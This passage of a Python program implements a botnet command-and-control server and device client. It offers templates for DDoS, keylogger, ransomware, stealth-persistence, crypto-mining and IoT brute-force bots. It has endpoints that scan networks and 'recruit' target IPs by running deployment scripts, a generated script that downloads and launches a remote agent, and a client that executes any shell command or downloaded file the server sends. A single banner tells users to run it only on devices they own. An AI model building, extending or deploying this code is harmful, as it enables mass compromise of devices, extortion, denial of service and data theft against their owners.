        db.log_audit(bot_id, "bot_removal", "remove_bot", "success", "web_api")
        
        return web.json_response({
            "status": "success",
            "bot_id": bot_id,
            "message": "Bot removed successfully"
        })
        
    except Exception as e:
        logging.error(f"Bot removal error: {e}")
        return web.json_response({"error": str(e)}, status=500)

async def api_bot_templates(request):
    """Get available bot templates"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    templates = {
        "mobile": {
            "name": "Termux Mobile Bot",
            "description": "Android device with full Termux capabilities",
            "icon": "📱",
            "default_tags": ["mobile", "termux"],
            "capabilities": ["shell", "network", "file_operations", "system_info", "app_management"]
        },
        "server": {
            "name": "Server Bot", 
            "description": "Linux server with system admin tools",
            "icon": "🖥️",
            "default_tags": ["server", "linux"],
            "capabilities": ["shell", "network", "file_operations", "system_admin", "services", "docker"]
        },
        "scanner": {
            "name": "Network Scanner",
            "description": "Automated network reconnaissance and security testing",
            "icon": "🔍", 
            "default_tags": ["scanner", "network", "security"],
            "capabilities": ["network_scan", "port_scan", "service_discovery", "vulnerability_scan"]
        },
        "monitor": {
            "name": "Monitor Bot",
            "description": "System monitoring and performance metrics",
            "icon": "📊",
            "default_tags": ["monitor", "metrics"],
            "capabilities": ["system_monitoring", "performance_metrics", "alerts", "log_analysis"]
        },
        "proxy": {
            "name": "Proxy Bot", 
            "description": "Network proxy and traffic management",
            "icon": "🌐",
            "default_tags": ["proxy", "network"],
            "capabilities": ["proxy", "traffic_routing", "load_balancing", "anonymization"]
        },
        "stealth": {
            "name": "Stealth Bot",
            "description": "Covert operations and advanced infiltration",
            "icon": "👤",
            "default_tags": ["stealth", "covert"],
            "capabilities": ["stealth_mode", "process_hiding", "network_tunneling", "persistence"]
        },
        "miner": {
            "name": "Mining Bot",
            "description": "Cryptocurrency mining and resource utilization",
            "icon": "⛏️",
            "default_tags": ["miner", "crypto"],
            "capabilities": ["cpu_mining", "gpu_mining", "pool_management", "profit_optimization"]
        },
        "ddos": {
            "name": "DDoS Bot",
            "description": "Distributed denial of service testing",
            "icon": "💥",
            "default_tags": ["ddos", "stress"],
            "capabilities": ["stress_testing", "load_generation", "traffic_amplification", "coordination"]
        },
        "keylogger": {
            "name": "Keylogger Bot",
            "description": "Keystroke monitoring and data collection",
            "icon": "⌨️",
            "default_tags": ["keylogger", "monitoring"],
            "capabilities": ["keystroke_capture", "screen_capture", "clipboard_monitoring", "data_exfiltration"]
        },
        "ransomware": {
            "name": "Ransomware Bot",
            "description": "File encryption and ransom operations",
            "icon": "🔒",
            "default_tags": ["ransomware", "encryption"],
            "capabilities": ["file_encryption", "ransom_notes", "payment_tracking", "victim_communication"]
        },
        "botnet_controller": {
            "name": "Botnet Controller",
            "description": "Command and control for managing other bots",
            "icon": "👑",
            "default_tags": ["controller", "c2"],
            "capabilities": ["bot_management", "command_distribution", "data_aggregation", "reporting"]
        },
        "web_crawler": {
            "name": "Web Crawler Bot",
            "description": "Automated web scraping and data collection",
            "icon": "🕷️",
            "default_tags": ["crawler", "scraper"],
            "capabilities": ["web_scraping", "data_extraction", "site_mapping", "content_analysis"]
        },
        "social_media": {
            "name": "Social Media Bot",
            "description": "Social media automation and influence operations",
            "icon": "📢",
            "default_tags": ["social", "influence"],
            "capabilities": ["account_automation", "content_generation", "engagement_farming", "trend_manipulation"]
        },
        "iot_bot": {
            "name": "IoT Device Bot",
            "description": "Internet of Things device control and exploitation",
            "icon": "🌐",
            "default_tags": ["iot", "embedded"],
            "capabilities": ["device_enumeration", "firmware_exploitation", "telnet_brute", "default_credentials"]
        },
        "custom": {
            "name": "Custom Bot",
            "description": "Fully customizable bot with user-defined capabilities",
            "icon": "🛠️",
            "default_tags": ["custom", "user_defined"],
            "capabilities": ["user_defined"]
        }
    }
    
    return web.json_response({"templates": templates})

def generate_bot_script(bot_id, bot_type, tags, exec_allowed):
    """Generate deployment script for a bot"""
    script = f"""#!/bin/bash
# Auto-generated bot deployment script
# Bot ID: {bot_id}
# Bot Type: {bot_type}
# Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}

echo "🤖 Deploying {bot_type} bot: {bot_id}"

# Install dependencies if needed
if command -v pkg >/dev/null 2>&1; then
    # Termux environment
    pkg update -y
    pkg install python git curl -y
elif command -v apt >/dev/null 2>&1; then
    # Debian/Ubuntu
    apt update -y
    apt install python3 python3-pip git curl -y
fi

# Install Python dependencies
pip install websockets aiohttp psutil requests

# Download unified agent if not present
if [ ! -f "unified_agent_with_ui.py" ]; then
    curl -sSL https://raw.githubusercontent.com/MrNova420/unified-control/main/unified_agent_with_ui.py -o unified_agent_with_ui.py
    chmod +x unified_agent_with_ui.py
fi

# Start bot with configuration
python3 unified_agent_with_ui.py \\
    --mode device \\
    --id "{bot_id}" \\
    --server "${{UC_SERVER_URL:-ws://127.0.0.1:8765}}" \\
    --auth "${{UC_AUTH_TOKEN}}" \\
    {"--exec-allowed" if exec_allowed else ""} \\
    --tags {" ".join(tags)}

echo "✅ Bot {bot_id} deployment completed"
"""
    return script

# New API Endpoints for Enhanced Functionality

async def api_discover_network(request):
    """Discover devices on network that can be recruited"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    try:
        # Start network discovery
        results = await device_discoverer.discover_local_network()
        
        # Add enhanced network information
        import subprocess
        import socket
        
        network_info = {}
        try:
            # Get local network information
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            network_info["local_ip"] = local_ip
            network_info["hostname"] = hostname
            
            # Get network interface info
            try:
                netinfo_result = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=5)
                if netinfo_result.returncode == 0:
                    routes = [line.strip() for line in netinfo_result.stdout.split('\n') if line.strip()]
                    network_info["network_routes"] = routes[:5]  # First 5 routes
            except:
                try:
                    # Fallback for systems without 'ip' command
                    netinfo_result = subprocess.run(['netstat', '-rn'], capture_output=True, text=True, timeout=5)
                    if netinfo_result.returncode == 0:
                        routes = [line.strip() for line in netinfo_result.stdout.split('\n') if line.strip()]
                        network_info["network_routes"] = routes[:5]
                except:
                    network_info["network_routes"] = ["Network route info unavailable"]
                    
        except Exception as e:
            network_info["error"] = str(e)
        
        return web.json_response({
            "status": "success",
            "scan_timestamp": time.time(),
            "discovered_devices": results.get("discovered", []),
            "total_discovered": results.get("total", 0),
            "network_info": network_info
        })
    except Exception as e:
        logging.error(f"Network discovery error: {e}")
        return web.json_response({"error": str(e)}, status=500)

async def api_discover_results(request):
    """Get device discovery results"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    return web.json_response({
        "scan_results": device_discoverer.scan_results,
        "discovered_devices": device_discoverer.discovered_devices
    })

async def api_recruit_device(request):
    """Generate recruitment script for discovered device"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    try:
        data = await request.json()
        target_ip = data.get("target_ip")
        target_os = data.get("target_os", "linux")
        
        if not target_ip:
            return web.json_response({"error": "target_ip required"}, status=400)
        
        script = await device_discoverer.generate_recruitment_script(target_ip, target_os)
        
        return web.json_response({
            "status": "success",
            "target_ip": target_ip,
            "target_os": target_os,
            "recruitment_script": script
        })
    except Exception as e:
        return web.json_response({"error": str(e)}, status=500)

async def api_deploy_bot(request):
    """Actually deploy a bot to a target device"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    try:
        data = await request.json()
        target_ip = data.get("target_ip")
        target_os = data.get("target_os", "linux")
        deployment_method = data.get("method", "auto")  # auto, ssh, http, manual
        
        if not target_ip:
            return web.json_response({"error": "target_ip required"}, status=400)
        
        # Generate and execute deployment script
        script = await device_discoverer.generate_recruitment_script(target_ip, target_os)
        
        deployment_result = {"status": "script_generated", "script": script}
        
        if deployment_method == "auto":
            # Try to actually execute the deployment
            try:
                import subprocess
                import tempfile
                
                # Save script to temporary file
                with tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False) as f:
                    f.write(script)
                    script_path = f.name
                
                # Make script executable and run it
                os.chmod(script_path, 0o755)
                result = subprocess.run(['/bin/bash', script_path], 
                                      capture_output=True, text=True, timeout=60)
                
                deployment_result.update({
                    "status": "deployment_attempted",
                    "success": result.returncode == 0,
                    "output": result.stdout,
                    "error": result.stderr
                })
                
                # Cleanup
                os.unlink(script_path)
                
            except Exception as deploy_error:
                deployment_result.update({
                    "status": "deployment_failed",
                    "error": str(deploy_error)
                })
        
        return web.json_response({
            "status": "success",
            "target_ip": target_ip,
            "target_os": target_os,
            "deployment": deployment_result
        })
        
    except Exception as e:
        return web.json_response({"error": str(e)}, status=500)

async def api_terminal_execute(request):
    """Execute terminal command with enhanced capabilities"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    try:
        data = await request.json()
        target = data.get("target", "all")
        command = data.get("command")
        user_context = data.get("user_context", "web_terminal")
        
        if not command:
            return web.json_response({"error": "command required"}, status=400)
        
        # Execute via enhanced terminal interface
        result = await terminal_interface.execute_terminal_command(target, command, user_context)
        
        return web.json_response({
            "status": "success",
            "execution_result": result,
            "timestamp": time.time()
        })
    except Exception as e:
        logging.error(f"Terminal execution error: {e}")
        return web.json_response({"error": str(e)}, status=500)

async def api_terminal_history(request):
    """Get terminal command history"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    # Get last 100 commands from history
    history = terminal_interface.command_history[-100:]
    
    return web.json_response({
        "command_history": history,
        "total_commands": len(terminal_interface.command_history)
    })

async def api_optimization_profile(request):
    """Get system optimization profile"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    try:
        profile = resource_optimizer.create_optimization_profile()
        return web.json_response({
            "status": "success",
            "optimization_profile": profile,
            "current_limits": {
                "max_devices": MAX_DEVICES,
                "max_workers": MAX_CONCURRENT_COMMANDS,
                "max_memory_mb": MAX_MEMORY_MB,
                "exec_timeout": EXEC_TIMEOUT
            }
        })
    except Exception as e:
        return web.json_response({"error": str(e)}, status=500)

async def api_apply_optimization(request):
    """Apply optimization settings"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    try:
        data = await request.json()
        auto_optimize = data.get("auto_optimize", True)
        
        if auto_optimize:
            # Apply automatic optimization
            optimized = auto_optimize_resources()
            return web.json_response({
                "status": "success",
                "auto_optimized": optimized,
                "new_limits": {
                    "max_devices": MAX_DEVICES,
                    "max_workers": MAX_CONCURRENT_COMMANDS,
                    "max_memory_mb": MAX_MEMORY_MB
                }
            })
        else:
            # Manual optimization settings
            custom_limits = data.get("custom_limits", {})
            # Apply custom limits here if needed
            return web.json_response({"status": "success", "custom_applied": True})
            
    except Exception as e:
        return web.json_response({"error": str(e)}, status=500)

def start_http_server():
    """Initialize HTTP server"""
    app = web.Application()
    
    # Add routes
    app.router.add_get("/ui", route_ui)
    app.router.add_post("/api/upload", api_upload)
    app.router.add_get("/api/uploads", api_list_uploads)
    app.router.add_get("/files/{file_id}", api_serve_file)
    app.router.add_get("/api/devices", api_devices)
    app.router.add_post("/api/send", api_send_command)
    
    # Enhanced API endpoints
    app.router.add_post("/api/send/balanced", api_load_balanced_send)
    app.router.add_get("/api/device/groups", api_device_groups)
    app.router.add_post("/api/device/groups", api_device_groups)
    app.router.add_get("/api/device/services", api_device_services)
    app.router.add_post("/api/device/services", api_device_services)
    app.router.add_get("/api/system/stats", api_system_stats)
    app.router.add_post("/api/bulk/command", api_bulk_command)
    
    # Bot Management API endpoints
    app.router.add_post("/api/bot/create", api_create_bot)
    app.router.add_post("/api/bot/remove", api_remove_bot)
    app.router.add_get("/api/bot/templates", api_bot_templates)
    
    # Device Discovery endpoints
    app.router.add_post("/api/discover/network", api_discover_network)
    app.router.add_get("/api/discover/results", api_discover_results)
    app.router.add_post("/api/discover/recruit", api_recruit_device)
    app.router.add_post("/api/discover/deploy", api_deploy_bot)
    
    # Enhanced Terminal endpoints
    app.router.add_post("/api/terminal/execute", api_terminal_execute)
    app.router.add_get("/api/terminal/history", api_terminal_history)
    
    # Resource Optimization endpoints
    app.router.add_get("/api/optimization/profile", api_optimization_profile)
    app.router.add_post("/api/optimization/apply", api_apply_optimization)
    
    return app

# Device client functionality
class DeviceClient:
    """Device client that connects to the control server"""
    
    def __init__(self, device_id: str, server_url: str, auth_token: str, 
                 tags: List[str] = None, exec_allowed: bool = False):
        self.device_id = device_id
        self.server_url = server_url
        self.auth_token = auth_token
        self.tags = tags or []
        self.exec_allowed = exec_allowed
        self.websocket = None
        self.running = False
    
    async def connect(self):
        """Connect to server"""
        try:
            self.websocket = await websockets.connect(self.server_url)
            
            # Send authentication
            auth_data = {
                "token": self.auth_token,
                "device_id": self.device_id,
                "meta": {
                    "tags": self.tags,
                    "exec_allowed": self.exec_allowed,
                    "platform": sys.platform,
                    "python_version": sys.version
                }
            }
            
            await self.websocket.send(json.dumps(auth_data))
            response = await self.websocket.recv()
            response_data = json.loads(response)
            
            if "error" in response_data:
                logging.error(f"Authentication failed: {response_data['error']}")
                return False
            
            logging.info(f"Device {self.device_id} connected successfully")
            self.running = True
            return True
            
        except Exception as e:
            logging.error(f"Connection failed: {e}")
            return False
    
    async def run(self):
        """Main device client loop"""
        if not await self.connect():
            return
        
        # Start heartbeat task
        heartbeat_task = asyncio.create_task(self.heartbeat_loop())
        
        try:
            async for message in self.websocket:
                try:
                    data = json.loads(message)
                    await self.handle_command(data)
                except json.JSONDecodeError:
                    logging.warning("Received invalid JSON")
                except Exception as e:
                    logging.error(f"Error handling command: {e}")
        
        except websockets.exceptions.ConnectionClosed:
            logging.info("Connection closed")
        except Exception as e:
            logging.error(f"Connection error: {e}")
        finally:
            self.running = False
            heartbeat_task.cancel()
    
    async def heartbeat_loop(self):
        """Send periodic heartbeats"""
        while self.running:
            try:
                await asyncio.sleep(HEARTBEAT_INTERVAL)
                if self.websocket:
                    heartbeat = {"type": "heartbeat", "timestamp": time.time()}
                    await self.websocket.send(json.dumps(heartbeat))
            except Exception as e:
                logging.error(f"Heartbeat error: {e}")
                break
    
    async def handle_command(self, data: Dict):
        """Handle command from server"""
        cmd_type = data.get("type")
        
        if cmd_type == "command":
            result = await self.execute_command(data.get("command", ""))
            await self.send_result("command", data.get("command", ""), result)
        
        elif cmd_type == "run_upload":
            if not self.exec_allowed:
                result = {"success": False, "error": "execution not allowed"}
            else:
                result = await self.run_uploaded_file(data)
            await self.send_result("run_upload", data.get("upload_id", ""), result)
        
        elif cmd_type == "deploy_service":
            if not self.exec_allowed:
                result = {"success": False, "error": "execution not allowed"}
            else:
                result = await self.deploy_service(data)
            await self.send_result("deploy_service", data.get("service_name", ""), result)
        
        elif cmd_type == "restart_service":
            result = await self.restart_service(data.get("service_name", ""))
            await self.send_result("restart_service", data.get("service_name", ""), result)
        
        elif cmd_type == "get_system_info":
            result = await self.get_system_info()
            await self.send_result("system_info", "get_system_info", result)
    
    async def execute_command(self, command: str) -> Dict:
        """Execute shell command"""
        try:
            process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(), 
                timeout=EXEC_TIMEOUT
            )
            
            return {
                "success": process.returncode == 0,
                "returncode": process.returncode,
                "stdout": stdout.decode('utf-8', errors='replace'),
                "stderr": stderr.decode('utf-8', errors='replace')
            }
            
        except asyncio.TimeoutError:
            return {"success": False, "error": "command timeout"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def run_uploaded_file(self, data: Dict) -> Dict:
        """Download and execute uploaded file"""
        try:
            file_url = data.get("file_url")
            filename = data.get("filename")
            expected_sha256 = data.get("sha256")
            
            if not file_url:
                return {"success": False, "error": "no file URL provided"}
            
            # Download file
            import requests
            response = requests.get(file_url, timeout=30)
            response.raise_for_status()
            
            # Verify SHA256
            file_content = response.content
            actual_sha256 = hashlib.sha256(file_content).hexdigest()
            
            if expected_sha256 and actual_sha256 != expected_sha256:
                return {"success": False, "error": "file integrity check failed"}
            
            # Create temporary file
            with tempfile.NamedTemporaryFile(delete=False, suffix=f"_{filename}") as temp_file:
                temp_file.write(file_content)
                temp_path = temp_file.name
            
            try:
                # Execute in sandbox
                result = SandboxedExecutor.execute_file(temp_path)
                return result
            finally:
                # Clean up
                try:
                    os.unlink(temp_path)
                except:
                    pass
                    
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def deploy_service(self, data: Dict) -> Dict:
        """Deploy and start a service"""
        try:
            service_name = data.get("service_name")
            file_path = data.get("file_path")
            auto_restart = data.get("auto_restart", True)
            
            if not service_name or not file_path:
                return {"success": False, "error": "missing service_name or file_path"}
            
            # For now, treat as regular file execution
            # In a full implementation, this would set up proper service management
            result = await self.execute_command(f"python3 {file_path} &")
            
            if result.get("success"):
                return {
                    "success": True,
                    "service_name": service_name,
                    "status": "deployed",
                    "auto_restart": auto_restart,
                    "pid": "N/A"  # Would capture real PID in full implementation
                }
            else:
                return result
                
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def restart_service(self, service_name: str) -> Dict:
        """Restart a service"""
        try:
            if not service_name:
                return {"success": False, "error": "service_name required"}
            
            # Simple restart simulation - in real implementation would manage actual services
            result = await self.execute_command(f"pkill -f {service_name} && sleep 1")
            return {"success": True, "service_name": service_name, "status": "restarted"}
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def get_system_info(self) -> Dict:
        """Get comprehensive system information"""
        try:
            info = {
                "device_id": self.device_id,
                "platform": sys.platform,
                "python_version": sys.version,
                "exec_allowed": self.exec_allowed,
                "tags": self.tags,
                "uptime": "N/A",
                "memory": "N/A",
                "cpu": "N/A",
                "disk": "N/A"
            }
            
            # Try to get additional system info
            try:
                uptime_result = await self.execute_command("uptime")
                if uptime_result.get("success"):
                    info["uptime"] = uptime_result.get("stdout", "").strip()
            except:
                pass
            
            try:
                mem_result = await self.execute_command("free -h")
                if mem_result.get("success"):
                    info["memory"] = mem_result.get("stdout", "").strip()
            except:
                pass
            
            try:
                disk_result = await self.execute_command("df -h")
                if disk_result.get("success"):
                    info["disk"] = disk_result.get("stdout", "").strip()
            except:
                pass
            
            return {"success": True, "system_info": info}
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def send_result(self, action: str, command: str, result: Dict):
        """Send command result back to server"""
        try:
            message = {
                "type": "command_result",
                "action": action,
                "command": command,
                "result": result,
                "timestamp": time.time()
            }
            await self.websocket.send(json.dumps(message))
        except Exception as e:
            logging.error(f"Failed to send result: {e}")

# Main application logic
async def cleanup_stale_clients():
    """Remove clients that haven't been seen recently"""
    while True:
        try:
            await asyncio.sleep(60)  # Check every minute
            current_time = time.time()
            stale_clients = []
            
            async with clients_lock:
                for client_id, client_info in clients.items():
                    if current_time - client_info["last_seen"] > DEVICE_TIMEOUT:
                        stale_clients.append(client_id)
                
                for client_id in stale_clients:
                    logging.info(f"Removing stale client: {client_id}")
                    clients.pop(client_id, None)
                    
        except Exception as e:
            logging.error(f"Cleanup error: {e}")

async def memory_optimizer():
    """Periodic memory optimization and resource cleanup"""
    while True:
        try:
            await asyncio.sleep(300)  # Run every 5 minutes
            
            # Clear command queue if it's getting too large
            if command_queue.qsize() > COMMAND_QUEUE_SIZE * 0.8:
                while command_queue.qsize() > COMMAND_QUEUE_SIZE * 0.5:
                    try:
                        command_queue.get_nowait()
                    except asyncio.QueueEmpty:
                        break
                logging.info("Command queue cleared to prevent overflow")
            
            # Clean up old device groups
            device_manager.cleanup_empty_groups()
            
            # Log current resource usage
            memory_percent = psutil.virtual_memory().percent
            cpu_percent = psutil.cpu_percent(interval=None)
            
            if memory_percent > 80 or cpu_percent > 80:
                logging.warning(f"High resource usage detected: CPU {cpu_percent}%, Memory {memory_percent}%")
                
        except Exception as e:
            logging.error(f"Memory optimizer error: {e}")

def main():
    """Main application entry point"""
    global db, AUTH_TOKEN, HOST, WS_PORT, HTTP_PORT, UPLOAD_DIR
    
    parser = argparse.ArgumentParser(description="Unified Device Control System")
    parser.add_argument("--mode", choices=["server", "device"], required=True,
                       help="Run as server or device client")
    parser.add_argument("--auth", required=True,
                       help="Authentication token")
    parser.add_argument("--host", default=DEFAULT_HOST,
                       help="Server host address")
    parser.add_argument("--ws-port", type=int, default=DEFAULT_WS_PORT,
                       help="WebSocket server port")
    parser.add_argument("--http-port", type=int, default=DEFAULT_HTTP_PORT,
                       help="HTTP server port")
    parser.add_argument("--db", default=DEFAULT_DB_PATH,
                       help="Database file path")
    parser.add_argument("--upload-dir", default=DEFAULT_UPLOAD_DIR,
                       help="Upload directory path")
    
    # Device-specific options
    parser.add_argument("--id", help="Device ID (required for device mode)")
    parser.add_argument("--server", help="WebSocket server URL (required for device mode)")
    parser.add_argument("--exec-allowed", action="store_true",
                       help="Allow file execution on this device")
    parser.add_argument("--tags", nargs="*", default=[],
                       help="Device tags for targeting")
    
    args = parser.parse_args()
    
    # Set global configuration
    AUTH_TOKEN = args.auth
    HOST = args.host
    WS_PORT = args.ws_port
    HTTP_PORT = args.http_port
    UPLOAD_DIR = args.upload_dir
    
    if args.mode == "server":
        # Auto-optimize resources on startup
        auto_optimized = auto_optimize_resources()
        if auto_optimized:
            print(f"⚙️ Auto-optimization completed: {MAX_DEVICES} devices, {MAX_CONCURRENT_COMMANDS} workers")
        
        # Initialize database
        db = Database(args.db)
        
        # Initialize persistent storage system
        global persistent_storage
        persistent_storage = PersistentStorage(args.db)
        
        print(f"""
🚀 Advanced Unified Bot Network Control Server Starting...

📡 WebSocket Server: ws://{HOST}:{WS_PORT}
🌐 Web Interface: http://{HOST}:{HTTP_PORT}/ui?token={AUTH_TOKEN}
📁 Upload Directory: {UPLOAD_DIR}
💾 Database: {args.db}
📊 Enhanced Storage: Logs, Sessions, Metrics Tracking

🤖 Bot Network Capabilities:
   • Support for 50,000+ devices
   • 15 specialized bot templates  
   • Device discovery and recruitment
   • Real terminal mode with full shell access
   • Advanced resource optimization
   • Load balancing with {MAX_CONCURRENT_COMMANDS} workers
   • Persistent storage for logs and progress

⚠️  SECURITY WARNING: Only use on devices you own and control!
""")
        
        async def start_server():
            global load_balancer
            
            # Initialize load balancer
            load_balancer = LoadBalancer()
            await load_balancer.start()
            
            # Start WebSocket server
            server = await websockets.serve(handle_client, HOST, WS_PORT)
            
            # Start HTTP server
            app = start_http_server()
            runner = web.AppRunner(app)
            await runner.setup()
            site = web.TCPSite(runner, HOST, HTTP_PORT)
            await site.start()
            
            # Initialize local device as control bot
            await initialize_control_bot()
            
            # Start cleanup task
            # Start cleanup and optimization tasks
            asyncio.create_task(cleanup_stale_clients())
            asyncio.create_task(memory_optimizer())
            
            # Start metrics recording task
            async def record_metrics():
                """Periodically record system metrics"""
                while True:
                    try:
                        if persistent_storage:
                            persistent_storage.track_system_metrics()
                        await asyncio.sleep(60)  # Record metrics every minute
                    except Exception as e:
                        logging.error(f"Metrics recording error: {e}")
                        await asyncio.sleep(60)
            
            asyncio.create_task(record_metrics())
            
            logging.info("Server started successfully with load balancer")
            print("✅ Server is running. Press Ctrl+C to stop.")
            
            # Wait forever
            await server.wait_closed()
        
        try:
            asyncio.run(start_server())
        except KeyboardInterrupt:
            print("\n🛑 Shutting down server...")
    
    elif args.mode == "device":
        if not args.id or not args.server:
            print("❌ Device mode requires --id and --server arguments")
            sys.exit(1)
        
        print(f"""
📱 Device Client Starting...

🆔 Device ID: {args.id}
📡 Server: {args.server}
🔧 Exec Allowed: {args.exec_allowed}
🏷️  Tags: {args.tags}
""")
        
        # Create device client
        client = DeviceClient(
            device_id=args.id,
            server_url=args.server,
            auth_token=AUTH_TOKEN,
            tags=args.tags,
            exec_allowed=args.exec_allowed
        )
        
        # Run client
        try:
            asyncio.run(client.run())
        except KeyboardInterrupt:
            print("\n🛑 Device client stopped")

if __name__ == "__main__":
    main()